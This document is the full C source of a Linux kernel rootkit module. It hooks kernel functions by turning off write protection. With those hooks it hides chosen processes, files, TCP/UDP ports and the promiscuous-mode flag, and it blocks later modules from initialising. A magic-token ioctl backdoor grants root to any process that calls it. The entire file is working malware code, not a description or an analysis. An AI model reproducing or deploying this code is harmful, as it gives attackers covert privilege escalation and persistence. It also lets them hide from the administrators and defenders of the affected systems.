#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <generated/autoconf.h>

// Hook functions

#define HOOK_SIZE 12
#define HOOK_OFFSET 2
#define JMP_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" // mov rax, addr; jmp rax
#define __DEBUG_HOOK__ 0

#define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)

#if __DEBUG_HOOK__
#define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
#define DEBUG_HOOK(fmt, ...)
#endif

char *strnstr(const char *haystack, const char *needle, size_t len);

void hook_start(void *target, void *trampoline);
void hook_stop(void *target);
void hook_pause(void *target);
void hook_resume(void *target);

struct sym_hook
{
    void *addr;
    unsigned char origin_code[HOOK_SIZE];
    unsigned char new_code[HOOK_SIZE];
    struct list_head list;
};

// list for hooked func
LIST_HEAD(hooked_syms);

inline unsigned long disable_wp(void)
{
    unsigned long cr0;
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void enable_wp(unsigned long cr0)
{
    write_cr0(cr0);
}

void hook_start(void *target, void *trampoline)
{
    struct sym_hook *sa;
    unsigned char origin_code[HOOK_SIZE], new_code[HOOK_SIZE];
    unsigned long origin_cr0;

    memcpy(new_code, JMP_CODE, HOOK_SIZE);
    *(unsigned long *)&new_code[HOOK_OFFSET] = (unsigned long)trampoline;

    DEBUG_HOOK("Hooking funciton 0x%p with 0x%p %px\n", target, trampoline, (unsigned long)target);

    memcpy(origin_code, target, HOOK_SIZE);
    origin_cr0 = disable_wp();
    memcpy(target, new_code, HOOK_SIZE);
    enable_wp(origin_cr0);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if (!sa)
    {
        return;
    }

    sa->addr = target;
    memcpy(sa->origin_code, origin_code, HOOK_SIZE);
    memcpy(sa->new_code, new_code, HOOK_SIZE);
    // insert into hooked list
    list_add(&sa->list, &hooked_syms);
}

void hook_stop(void *target)
{
    struct sym_hook *sa;
    DEBUG_HOOK("Unhooking function 0x%p\n", target);
    // iterate hooked list to search target
    // find every strut sym_hook from list member
    list_for_each_entry(sa, &hooked_syms, list)
    {
        if (target == sa->addr)
        {
            unsigned long origin_cr0 = disable_wp();
            memcpy(target, sa->origin_code, HOOK_SIZE);
            enable_wp(origin_cr0);

            list_del(&sa->list);
            kfree(sa);
            break;
        }
    }
}

void hook_pause(void *target)
{
    struct sym_hook *sa;

    DEBUG_HOOK("Pausing function hook 0x%p\n", target);

    list_for_each_entry(sa, &hooked_syms, list)
    {
        if (target == sa->addr)
        {
            unsigned long origin_cr0 = disable_wp();
            memcpy(target, sa->origin_code, HOOK_SIZE);
            enable_wp(origin_cr0);
        }
    }
}

void hook_resume(void *target)
{
    struct sym_hook *sa;

    DEBUG_HOOK("Resuming function hook 0x%p\n", target);

    list_for_each_entry(sa, &hooked_syms, list)
    {
        if (target == sa->addr)
        {
            unsigned long origin_cr0 = disable_wp();
            memcpy(target, sa->new_code, HOOK_SIZE);
            enable_wp(origin_cr0);
        }
    }
}

// Hook vfs to hide procs and files

static int (*proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
static int (*proc_iterate)(struct file *, struct dir_context *);
static int (*root_iterate)(struct file *, struct dir_context *);

#define ITERATE_NAME iterate_shared
#define ITERATE_PROTO struct file *file, struct dir_context *ctx
#define FILLDIR_VAR ctx->actor
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)  \
    {                                                \
        *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC; \
        ret = ITERATE_FUNC(file, ctx);               \
    }

struct hidden_proc
{
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

void hide_proc(unsigned short pid)
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
    {
        return;
    }

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc(unsigned short pid)
{
    struct hidden_proc *hp;

    list_for_each_entry(hp, &hidden_procs, list)
    {
        if (pid == hp->pid)
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

struct hidden_file
{
    char *name;
    struct list_head list;
};

LIST_HEAD(hidden_files);

void hide_file(char *name)
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if (!hf)
    {
        return;
    }

    hf->name = name;

    list_add(&hf->list, &hidden_files);
}

void unhide_file(char *name)
{
    struct hidden_file *hf;

    list_for_each_entry(hf, &hidden_files, list)
    {
        if (!strcmp(name, hf->name))
        {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf);
            break;
        }
    }
}

void *get_vfs_iterate_shared(const char *path)
{
    void *ret;
    struct file *filep;
    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
    {
        DEBUG("Failed to open file: %s", path);
        return NULL;
    }
    ret = filep->f_op->ITERATE_NAME;

    filp_close(filep, 0);

    return ret;
}

static int new_proc_filldir(struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    // iterate hidden procs and hide all
    list_for_each_entry(hp, &hidden_procs, list)
    {
        if (pid == hp->pid)
        {
            DEBUG("Hidding the proc %ld", pid);
            return 0;
        }
    }

    return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
}

int new_proc_iterate(ITERATE_PROTO)
{
    int ret;

    proc_filldir = FILLDIR_VAR;

    hook_pause(proc_iterate);
    REPLACE_FILLDIR(proc_iterate, new_proc_filldir);
    hook_resume(proc_iterate);

    return ret;
}

static int new_root_filldir(struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct hidden_file *hf;

    list_for_each_entry(hf, &hidden_files, list)
    {
        if (!strcmp(name, hf->name))
        {
            DEBUG("Hidding the file %s", name);
            return 0;
        }
    }

    return root_filldir(npf_ctx, name, namelen, offset, ino, d_type);
}

int new_root_iterate(ITERATE_PROTO)
{
    int ret;

    root_filldir = FILLDIR_VAR;
    hook_pause(root_iterate);
    REPLACE_FILLDIR(root_iterate, new_root_filldir);
    hook_resume(root_iterate);

    return ret;
}

// Hook seq_show to hide ports

static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

// tcp seq width(150) different from udp(128)
#define TMPSZ_TCP 150
#define TMPSZ_UDP 128
#define TMPSZ_TCP_6 177
#define TMPSZ_UDP_6 177

struct hidden_port
{
    unsigned short port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);
LIST_HEAD(hidden_tcp6_ports);
LIST_HEAD(hidden_udp4_ports);
LIST_HEAD(hidden_udp6_ports);

void hide_port(unsigned short port, struct list_head *hidden_ports_list)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
    {
        return;
    }

    hp->port = port;

    list_add(&hp->list, hidden_ports_list);
}

void unhide_port(unsigned short port, struct list_head *hidden_ports_list)
{
    struct hidden_port *hp;

    list_for_each_entry(hp, hidden_ports_list, list)
    {
        if (port == hp->port)
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

char *strnstr(const char *haystack, const char *needle, size_t n)
{
    char *s = strstr(haystack, needle);

    if (s == NULL)
        return NULL;

    if (s - haystack + strlen(needle) <= n)
        return s;
    else
        return NULL;
}

void *get_tcp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
    {
        DEBUG("Failed to open file: %s", path);
        return NULL;
    }

    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);

    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

static int new_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hook_pause(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hook_resume(tcp4_seq_show);

    list_for_each_entry(hp, &hidden_tcp4_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ_TCP, port, TMPSZ_TCP))
        {
            seq->count -= TMPSZ_TCP;
            break;
        }
    }

    return ret;
}

static int new_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hook_pause(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hook_resume(tcp6_seq_show);

    list_for_each_entry(hp, &hidden_tcp6_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ_TCP_6, port, TMPSZ_TCP_6))
        {
            seq->count -= TMPSZ_TCP_6;
            break;
        }
    }

    return ret;
}

void *get_udp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
    {
        DEBUG("Failed to open file: %s", path);
        return NULL;
    }

    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);

    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

static int new_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hook_pause(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hook_resume(udp4_seq_show);

    list_for_each_entry(hp, &hidden_udp4_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ_UDP, port, TMPSZ_UDP))
        {
            seq->count -= TMPSZ_UDP;
            break;
        }
    }

    return ret;
}

static int new_udp6_seq_show(struct seq_file *seq, void *v)
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hook_pause(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hook_resume(udp6_seq_show);

    list_for_each_entry(hp, &hidden_udp6_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ_UDP_6, port, TMPSZ_UDP_6))
        {
            seq->count -= TMPSZ_UDP_6;
            break;
        }
    }

    return ret;
}

// Hook to hide PROMISC

unsigned int hide_promisc = 0;

unsigned int new_dev_get_flags(const struct net_device *dev)
{
    unsigned int ret;

    hook_pause(dev_get_flags);
    ret = dev_get_flags(dev);
    hook_resume(dev_get_flags);

    if (hide_promisc)
    {
        ret &= ~IFF_PROMISC;
    }

    return ret;
}

// Replace module init and exit

unsigned int module_loading_disabled = 0;

int new_init(void)
{
    return 0;
}

void new_exit(void)
{
}

int module_handler(struct notifier_block *nb, unsigned long action, void *data)
{
    unsigned long flags;
    struct module *param = data;
    DEFINE_SPINLOCK(module_event_spinlock);

    spin_lock_irqsave(&module_event_spinlock, flags);

    switch (param->state)
    {
    case MODULE_STATE_COMING:
    {
        DEBUG("Detected module %s and replacing init and exit\n", param->name);
        param->init = new_init;
        param->exit = new_exit;
    }
    break;
    default:
        break;
    }

    spin_unlock_irqrestore(&module_event_spinlock, flags);

    return NOTIFY_DONE;
}

static struct notifier_block nb = {
    .notifier_call = module_handler,
    .priority = INT_MAX,
};

void disable_module_loading(void)
{
    register_module_notifier(&nb);
}

void enable_module_loading(void)
{
    unregister_module_notifier(&nb);
}

// Hook inet_ioctl to control rootkit

#define AUTH_TOKEN 0x12345678

struct s_args
{
    unsigned short cmd;
    void *ptr;
};

struct s_proc_args
{
    unsigned short pid;
};

struct s_port_args
{
    unsigned short port;
};

struct s_file_args
{
    char *name;
    unsigned short namelen;
};

static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);

void *get_inet_ioctl(int family, int type, int protocol)
{
    void *ret;
    struct socket *sock = NULL;

    if (sock_create(family, type, protocol, &sock))
    {
        DEBUG("Failed to create socket\n");
        return NULL;
    }

    ret = sock->ops->ioctl;

    sock_release(sock);

    return ret;
}

static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
{
    int ret;
    unsigned long flags;
    struct s_args args;
    DEFINE_SPINLOCK(spinlock);

    if (cmd == AUTH_TOKEN)
    {
        DEBUG("Authenticated, receiving command\n");

        // convert arg to s_args { cmd, ptr }
        // ptr point to further arg struct such as s_proc_args, s_file_args, s_port_args
        ret = copy_from_user(&args, (void *)arg, sizeof(args));

        if (ret)
        {
            return 0;
        }

        switch (args.cmd)
        {
        // Give root
        case 0:
            DEBUG("Giving root to PID %hu\n", current->pid);

            commit_creds(prepare_kernel_cred(0));
            break;
        // Hide proc
        case 1:
        {

            struct s_proc_args proc_args;

            ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Hiding PID %hu\n", proc_args.pid);

            hide_proc(proc_args.pid);
        }
        break;
        // Unhide proc
        case 2:
        {

            struct s_proc_args proc_args;

            ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Unhiding PID %hu\n", proc_args.pid);

            unhide_proc(proc_args.pid);
        }
        break;
        // Hide tcp v4 port
        case 3:
        {

            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Hiding tcp v4 port %hu\n", port_args.port);

            hide_port(port_args.port, &hidden_tcp4_ports);
            // hide_tcp4_port(port_args.port);
        }
        break;
        // Unhide tcp v4 port
        case 4:
        {

            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Unhiding tcp v4 port %hu\n", port_args.port);

            unhide_port(port_args.port, &hidden_tcp4_ports);
            // unhide_tcp4_port(port_args.port);
        }
        break;
        // Hide tcp v6 port
        case 5:
        {
            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Hiding tcp v6 port %hu\n", port_args.port);

            hide_port(port_args.port, &hidden_tcp6_ports);
        }
        break;
        // Unhide tcp v6 port
        case 6:
        {
            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Unhiding tcp v6 port %hu\n", port_args.port);

            unhide_port(port_args.port, &hidden_tcp6_ports);
        }
        break;
        // Hide udp v4 port
        case 7:
        {
            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Hiding udp v4 port %hu\n", port_args.port);

            hide_port(port_args.port, &hidden_udp4_ports);
        }
        break;
        // Unhide udp v4 port
        case 8:
        {
            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Unhiding udp v4 port %hu\n", port_args.port);

            unhide_port(port_args.port, &hidden_udp4_ports);
        }
        break;
        // Hide udp v6 port
        case 9:
        {
            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Hiding udp v6 port %hu", port_args.port);

            hide_port(port_args.port, &hidden_udp6_ports);
        }
        break;
        // Unhide udp v6 port
        case 10:
        {
            struct s_port_args port_args;

            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
            {
                return 0;
            }

            DEBUG("Unhiding udp v6 port %hu\n", port_args.port);

            unhide_port(port_args.port, &hidden_udp6_ports);
        }
        break;
        // Hide file/dir
        case 11:
        {
            char *name;
            struct s_file_args file_args;

            ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
            if (ret)
            {
                return 0;
            }

            name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
            if (!name)
            {
                return 0;
            }

            ret = copy_from_user(name, file_args.name, file_args.namelen);
            if (ret)
            {
                kfree(name);
                return 0;
            }

            name[file_args.namelen] = 0;

            DEBUG("Hiding file/dir %s\n", name);

            hide_file(name);
        }
        break;
        // Unhide file/dir
        case 12:
        {
            char *name;
            struct s_file_args file_args;

            ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
            if (ret)
            {
                return 0;
            }

            name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
            if (!name)
            {
                return 0;
            }

            ret = copy_from_user(name, file_args.name, file_args.namelen);
            if (ret)
            {
                kfree(name);
                return 0;
            }

            name[file_args.namelen] = 0;

            DEBUG("Unhiding file/air %s\n", name);

            unhide_file(name);
            kfree(name);
        }
        break;
        // Hide network PROMISC flag
        case 13:
            DEBUG("Hiding PROMISC flag\n");

            hide_promisc = 1;
            break;
        // Unhide network PROMISC flag
        case 14:
            DEBUG("Unhiding PROMISC flag\n");

            hide_promisc = 0;
            break;
        // Enable module loading
        case 15:
        {
            int *modules_disabled;

            DEBUG("Enable module loading\n");

            modules_disabled = (int *)kallsyms_lookup_name("modules_disabled");

            DEBUG("modules_disabled = %d\n", *modules_disabled);

            if (modules_disabled)
            {
                *modules_disabled = 0;
            }
        }
        break;
        // Prohibit module loading
        case 16:
        {
            DEBUG("Prohibiting module loading\n");

            spin_lock_irqsave(&spinlock, flags);
            if (!module_loading_disabled)
            {
                module_loading_disabled = 1;
                disable_module_loading();
            }
            spin_unlock_irqrestore(&spinlock, flags);
        }
        break;
        // Re-permit module loding
        case 17:
        {
            DEBUG("Re-permiting module loading\n");

            spin_lock_irqsave(&spinlock, flags);
            if (module_loading_disabled)
            {
                enable_module_loading();
                module_loading_disabled = 0;
            }
            spin_unlock_irqrestore(&spinlock, flags);
        }
        break;
        default:
            break;
        }

        return 0;
    }

    hook_pause(inet_ioctl);
    ret = inet_ioctl(sock, cmd, arg);
    hook_resume(inet_ioctl);

    return ret;
}

static int init_rootkit(void)
{
    DEBUG("begin the init function\n");

    // list_del_init(&__this_module.list);
    // kobject_del(__this_module.holders_dir->parent);

    // Hook /proc for hiding processes
    proc_iterate = get_vfs_iterate_shared("/proc");
    hook_start(proc_iterate, &new_proc_iterate);

    // Hook / for hiding files and directories
    root_iterate = get_vfs_iterate_shared("/");
    hook_start(root_iterate, &new_root_iterate);

    // Hook /proc/net/tcp for hiding tcp4 connections
    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    hook_start(tcp4_seq_show, &new_tcp4_seq_show);

    // Hook /proc/net/tcp6 for hiding tcp6 connections
    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
    hook_start(tcp6_seq_show, &new_tcp6_seq_show);

    // Hook /proc/net/udp for hiding udp4 connections
    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    hook_start(udp4_seq_show, &new_udp4_seq_show);

    // Hook /proc/net/udp6 for hiding udp4 connections
    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
    hook_start(udp6_seq_show, &new_udp6_seq_show);

    // Hook dev_get_flags() for PROMISC flag hiding
    hook_start(dev_get_flags, &new_dev_get_flags);

    // Hook inet_ioctl() for rootkit control
    inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    hook_start(inet_ioctl, &new_inet_ioctl);

    return 0;
}

static void cleanup_rootkit(void)
{
    hook_stop(inet_ioctl);
    hook_stop(dev_get_flags);
    hook_stop(udp6_seq_show);
    hook_stop(udp4_seq_show);
    hook_stop(tcp6_seq_show);
    hook_stop(tcp4_seq_show);
    hook_stop(root_iterate);
    hook_stop(proc_iterate);
    DEBUG("clean up the module\n");
}
module_init(init_rootkit);
module_exit(cleanup_rootkit);

// CANNOT REMOVED
// kernel/kallsyms.c
// EXPORT_SYMBOL_GPL(kallsyms_lookup_name);
MODULE_LICENSE("GPL");